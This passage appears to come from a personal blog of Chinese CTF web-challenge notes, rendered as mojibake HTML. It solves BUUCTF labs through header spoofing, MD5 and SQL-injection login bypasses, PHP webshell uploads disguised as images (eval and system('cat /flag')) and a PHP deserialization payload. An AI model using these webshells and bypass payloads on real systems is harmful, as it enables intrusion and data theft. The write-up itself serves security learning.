class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">Browser :</span> Syclover<br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">User-Agent:</span> Syclover<br><br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Syclover Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-operator">//</span>No<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span> you can only read this locally<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">From :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">X-Forwarded-For :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-operator">//</span>flag&#123;<span class="hljs-number">41</span>cea244-<span class="hljs-number">340</span>a-<span class="hljs-number">4</span>be9-bd6e-ba42db379119&#125;<br></code></pre></td></tr></table></figure>
<p>æœ‰ç‚¹å½“åˆBuildCTFé‡Œçš„ä¸€é¢˜ï¼Œä½†æ˜¯é‚£é“é¢˜è¦æ”¹çš„æ›´å¤š</p>
<hr>
<h2 id="title-note-28date-2025-04-17-22-35-50tags-note"><a href="#title-note-28date-2025-04-17-22-35-50tags-note" class="headerlink" title="title: note-28date: 2025-04-17 22:35:50tags: note"></a>title: note-28<br>date: 2025-04-17 22:35:50<br>tags: note</h2><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>åœ¨bpæŸ¥çœ‹ç›¸åº”ï¼Œçœ‹åˆ°ï¼š<br>hint: select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)<br>è¯•ä¸€ä¸‹ffifdyop<br>è¿”å›çš„é¡µé¢ä¸­æœ‰ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">$a = $GET[&#x27;a&#x27;];</span><br><span class="hljs-comment">$b = $_GET[&#x27;b&#x27;];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="hljs-comment">    // wow, glzjin wants a girl friend.</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>
<p>ä¸æ˜¯æ€ä¹ˆéƒ½åœ¨æ±‚girlfriend,<br>è¿™ä¸ªæˆ‘çŒœèƒ½ç”¨æ•°ç»„ç»•è¿‡</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=r[]&amp;b=<span class="hljs-string">q[]</span><br>//ä¸è¡Œ<br>?a=<span class="hljs-string">&#x27;1&#x27;</span>&amp;b=<span class="hljs-number">1</span><br>//<span class="hljs-keyword">no</span><br></code></pre></td></tr></table></figure>
<p>é‚£ç›´æ¥ä¸Šç½‘æŸ¥md5åŠ å¯†åèƒ½å¼±ç­‰äºçš„å­—ç¬¦</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=%271%27&amp;&amp;b=<span class="hljs-number">1</span><br><span class="hljs-comment">//ok</span><br></code></pre></td></tr></table></figure>
<p>è¿”å›</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªå¼ºä¸ç­‰äºè¯•ä¸€ä¸‹â€™1â€™,1</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">param1=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-comment">//no</span><br><br>param1[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>[]=<span class="hljs-number">2</span><br><span class="hljs-comment">// flag&#123;8277b79d-033f-4f57-a8dd-d74d41893128&#125; </span><br><span class="hljs-comment">//åŸæ¥æˆ‘åˆšæ‰ç”¨çš„æ•°ç»„ç»•è¿‡æ˜¯å†™é”™çš„å•ŠğŸ˜…</span><br><span class="hljs-comment">//è¯•äº†ä¸€ä¸‹ï¼Œlevels91.phpå’Œlevell14.phpï¼Œéƒ½èƒ½ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡</span><br></code></pre></td></tr></table></figure>

<h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>sqlä¸­md5çš„ä¸‡èƒ½å¯†ç <br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_12138/article/details/121847582">https://blog.csdn.net/Jeff_12138/article/details/121847582</a></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1><p>æ­£å¸¸ç©¿äº†ä¸€æ¬¡å›¾ç‰‡ï¼Œæ˜¾ç¤ºäº†ä¸Šä¼ æ–‡ä»¶çš„å‚¨å­˜ç›®å½•</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/uplo4d/</span><br></code></pre></td></tr></table></figure>
<p>ä¸Šç½‘éšä¾¿æ‰¾ä¸ªphpä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hack&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å…ˆæŠŠåæœ€æ”¹ä¸ºpngåœ¨å‰ç«¯é¡µé¢ä¸Šä¼ ï¼Œæˆ–è€…ç›´æ¥æ”¹å‰ç«¯<br>ç„¶åç”¨bpæŠŠåç¼€åæ”¹ä¸ºphpä¸Šä¼ <br>æç¤ºnono  </p>
<p>åæŠŠåç¼€æ”¹ä¸º .phtml<br>æˆåŠŸä¸Šä¼ <br>æœ€åèšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•å‘ç°flag  </p>
<h2 id="phtml-ç»•è¿‡"><a href="#phtml-ç»•è¿‡" class="headerlink" title="phtml ç»•è¿‡"></a>phtml ç»•è¿‡</h2><p>å°†æ–‡ä»¶åç¼€æ”¹ä¸º .phtmlï¼Œåœ¨ Apache æœåŠ¡å™¨ä¸Šä¼šè¢«å½“ä½œ PHP æ–‡ä»¶æ‰§è¡Œã€‚  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span>.phtml<br></code></pre></td></tr></table></figure>

<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>è®°å½•ä¸€ä¸‹å¿ƒè·¯å†ç¨‹ï¼š<br>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯sqlï¼Œç„¶åçœ‹åˆ°å‰ç«¯ä»£ç é‡Œæç¤ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">you are not admin <br></code></pre></td></tr></table></figure>
<p>ä»¥ä¸ºæ˜¯cookieï¼ŒæŠŠåˆå§‹çš„cookieè§£base64åå¥½åƒå‡ºäº†ä¸ªjsonæ ¼å¼çš„å•¥ï¼Œè¯•ç€æŠŠé‡Œé¢çš„â€1â€æ”¹ä¸ºâ€adminâ€ï¼Œ<br>æ²¡ç”¨ã€‚<br>éšåæ³¨å†Œäº†ä¸€ä¸ªè´¦æˆ·ï¼Œæƒ³èµ·äº†æ•°æ®åº“æ±¡æŸ“å•¥çš„ï¼Œä½†æ˜¯è¿™é¢˜ä¸æ˜¯<br>æ³¨å†Œè´¦æˆ·åç™»å½•ï¼Œç„¶åæ›´æ”¹å¯†ç ï¼Œ</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">123</span>&#x27;<span class="hljs-keyword">where</span> username=admin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åç”¨123æ¥ç™»å½•adminï¼Œæ‹¿åˆ°flag<br>æ²¡æƒ³åˆ°ä¸€æ¬¡æˆäº†</p>
<hr>
<h2 id="title-note-29date-2025-04-21-18-12-17tags-note"><a href="#title-note-29date-2025-04-21-18-12-17tags-note" class="headerlink" title="title: note-29date: 2025-04-21 18:12:17tags: note"></a>title: note-29<br>date: 2025-04-21 18:12:17<br>tags: note</h2><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;php.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;z&quot;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>æ˜¾ç¤ºä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ç›®å½•åœ¨å“ª<br>åœ¨urlè¯•äº†ä¸€ä¸‹<br>åœ¨è¿™ä¸ªç›®å½•  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/upload/</span>php.phtml<br></code></pre></td></tr></table></figure>
<p>è¯•äº†å¥½ä¹…å‘ç°é©¬æ²¡ç”Ÿæ•ˆ</p>
<p>ä¸Šç½‘æ‰¾äº†ä¸€ä¸ªæ–‡ä»¶å¤´</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;text.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);&lt;/script&gt;<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>from:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/120956861">https://blog.csdn.net/m0_55793759/article/details/120956861</a><br>æˆåŠŸ</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><p>ç½‘å€å¤‡ä»½æ²¡æ€è·¯ï¼Œä¾¿ä¸Šç½‘æŸ¥ï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€:<br><br>tar.gzï¼Œ<span class="hljs-built_in">zip</span>ï¼Œrarï¼Œtar<br><br>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼š<br><br>webï¼Œwebsiteï¼Œbackupï¼Œbackï¼Œwwwï¼Œwwwrootï¼Œtemp<br><br>åç”¨<br>www.<span class="hljs-built_in">zip</span>ä¸‹è½½å¤‡ä»½æºç <br></code></pre></td></tr></table></figure>
<p>é‡Œé¢æœ‰ä¸ªflag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å‡flagï¼Œï¼Œï¼Œ<br>å®¡è®¡index.phpï¼Œ<br>å¥½åƒæ˜¯ååºåˆ—åŒ–ï¼Ÿ  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;I have a cat!&lt;/title&gt;<br>  &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;</span>&gt;<br>      &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;style.css&quot;</span>&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>    <span class="hljs-comment">#login&#123;   </span><br>        position: absolute;   <br>        top: <span class="hljs-number">50</span>%;   <br>        left:<span class="hljs-number">50</span>%;   <br>        margin: -<span class="hljs-number">150</span>px <span class="hljs-number">0</span> <span class="hljs-number">0</span> -<span class="hljs-number">150</span>px;   <br>        width: <span class="hljs-number">300</span>px;   <br>        height: <span class="hljs-number">300</span>px;   <br>    &#125;   <br>    h4&#123;   <br>        font-size: <span class="hljs-number">2</span>em;   <br>        margin: <span class="hljs-number">0.67</span>em <span class="hljs-number">0</span>;   <br>    &#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br><br><br><br><br><br><br><br>&lt;div id=<span class="hljs-string">&quot;world&quot;</span>&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;</span>&gt;å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;</span>&gt;ä¸æ„§æ˜¯æˆ‘ï¼ï¼ï¼<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;</span>&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;position: absolute;bottom: 5%;width: 99%;&quot;</span>&gt;&lt;p align=<span class="hljs-string">&quot;center&quot;</span> style=<span class="hljs-string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script  src=<span class="hljs-string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
<p>select-&gt;name,<br>å¥½åƒè¦å…ˆæŸ¥çœ‹adminå¯†ç   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br><br><span class="hljs-keyword">return</span>:<br>NO!!!hacker!!!<br>You name is: nonono<br>You password is: yesyes<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;guest&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>å†ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯è¦ç»•è¿‡wakeupå‡½æ•°é‡Œçš„èµ‹å€¼ï¼Œä¸ç„¶å°±æ²¡æ³•è®©username&#x3D;adminï¼Œ<br>ä¸Šç½‘å·®äº†ä¸€ä¸‹ï¼Œå‘ç°ä»¥å‰æˆ‘å¥½åƒåšè¿‡wakeupç»•è¿‡çš„é¢˜ï¼Œé‚£å°±æ˜¯ä¿®æ”¹å…ƒç´ ä¸ªæ•°ï¼Œ<br>è¿˜æ˜¯ç»•ä¸è¿‡ï¼Œå»æ‰¾wp,æœ€åå‘ç°æ˜¯æœ‰privateï¼Œè¦ç”¨urlåŠ å¯†ï¼Œä¸ç„¶çš„è¯ä¼šæœ‰äº›ä¸å¯æ˜¾ç¤ºå­—ç¬¦çš„ç¼ºæ¼å¯¼è‡´é”™è¯¯<br>æœªurlåŠ å¯†ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°Nameusernameï¼Œå’ŒNamepassowrdï¼Œè¿™ä¸¤å…ƒç´ æ˜¯å› ä¸ºå°‘äº†å­—ç¬¦å¯¼è‡´è¿èµ·æ¥äº†ï¼Œç¼–ç åå¯ä»¥çœ‹åˆ°</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
<p>æ­£ç¡®çš„æ ·å¼åº”è¯¥æ˜¯ï¼š %00Name%00username , %00Name%00password<br>è®°å¾—è¦æŠŠ2æ”¹ä¸º3ï¼Œæ‰¾çš„æœ‰ç‚¹çœ¼èŠ±ï¼Œä¹Ÿå¯ä»¥åƒwpé‚£æ ·ä¼ ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>å‚è€ƒï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a><br><a href="https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/">https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/</a></p>
<hr>
<h2 id="title-note-30date-2025-04-23-19-58-29tags-note"><a href="#title-note-30date-2025-04-23-19-58-29tags-note" class="headerlink" title="title: note-30date: 2025-04-23 19:58:29tags: note"></a>title: note-30<br>date: 2025-04-23 19:58:29<br>tags: note</h2><h1 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1><p>æ‰«ç›®å½•ä¸€ç›´æ‰«ä¸å‡ºæ¥ï¼Œæ‰«äº†åæ¥æ¬¡ï¼Œæœ€åå‘ç°æ˜¯æ˜¯è¯·æ±‚å¤ªå¿«ï¼Œ</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u http://<span class="hljs-number">087</span>da459-<span class="hljs-number">7</span>de3-<span class="hljs-number">4061</span>-<span class="hljs-number">82</span>c8-b3cf69426d11.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w backup_include.txt --delay=<span class="hljs-number">1</span> -t <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>ç»ˆäºå‘ç°å¤‡ä»½æ–‡ä»¶<br>&#x2F;index.php.bak  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span 